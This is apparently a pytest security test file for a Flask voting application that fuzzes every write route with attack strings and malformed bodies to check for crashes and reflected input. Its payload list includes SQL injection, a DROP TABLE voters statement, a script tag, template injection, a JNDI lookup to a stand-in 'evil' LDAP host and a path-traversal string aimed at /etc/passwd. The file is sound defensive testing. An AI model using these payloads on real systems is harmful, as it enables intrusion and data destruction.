"""
SR-15: send attack input to every route that accepts data.

Payloads: SQL injection, script tags, template injection, path tricks,
very long text, wrong types. The app must not crash (no 5xx) and must
not send the payload back in the response.
"""

import pytest

import app as application

from login_flow import LoginCoordinator
from rate_limit import LoginRateLimiter


WRITE_METHODS = {"POST", "PUT", "PATCH", "DELETE"}
HTTPS = "https://localhost"

PAYLOADS = [
    "' OR '1'='1",
    "\"; DROP TABLE voters;--",
    "<script>alert(1)</script>",
    "{{7*7}}",
    "${jndi:ldap://evil/x}",
    "../../etc/passwd",
    "A" * 3000,
]

# If one of these shows in a response, the input was echoed back.
ECHO_MARKERS = ["<script>", "DROP TABLE", "{{7*7}}", "../../etc/passwd"]


def write_routes():
    routes = []
    for rule in application.app.url_map.iter_rules():
        methods = WRITE_METHODS & set(rule.methods)
        if rule.endpoint == "static" or not methods:
            continue
        # put a simple value in the URL parameters, like <record_id>
        url = rule.rule
        for argument in rule.arguments:
            url = url.replace(f"<int:{argument}>", "1")
            url = url.replace(f"<{argument}>", "x")
        for method in sorted(methods):
            routes.append((method, url))
    return routes


@pytest.fixture
def client(monkeypatch):
    monkeypatch.setitem(application.app.config, "TESTING", True)
    # CSRF off here, so the request reaches the login and validation code.
    monkeypatch.setitem(application.app.config, "WTF_CSRF_ENABLED", False)
    # Login needs a coordinator. No known voters, so every login fails.
    monkeypatch.setitem(
        application.app.config,
        "LOGIN_COORDINATOR",
        LoginCoordinator(
            lookup_voter=lambda account: None,
            rate_limiter=LoginRateLimiter(),
        ),
    )
    return application.app.test_client()


def test_sweep_finds_the_platform_write_routes():
    urls = {url for _, url in write_routes()}

    assert "/login" in urls
    assert any(url.startswith("/vote/") for url in urls)


@pytest.mark.parametrize("method,url", write_routes())
@pytest.mark.parametrize("payload", PAYLOADS)
def test_hostile_json_never_crashes_or_echoes(client, method, url, payload):
    body = {
        "account_id": payload,
        "password": payload,
        "totp_code": payload,
        "credential": payload,
        "candidate_id": payload,
        "address_text": payload,
    }

    response = client.open(url, method=method, json=body, base_url=HTTPS)

    assert response.status_code < 500
    text = response.get_data(as_text=True)
    assert not any(marker in text for marker in ECHO_MARKERS)


@pytest.mark.parametrize("method,url", write_routes())
@pytest.mark.parametrize(
    "raw", [b"", b"not json", b"[1,2,3]", b"null", b"\xff\xfe\x00"]
)
def test_malformed_bodies_never_crash(client, method, url, raw):
    response = client.open(
        url,
        method=method,
        data=raw,
        content_type="application/json",
        base_url=HTTPS,
    )

    assert response.status_code < 500
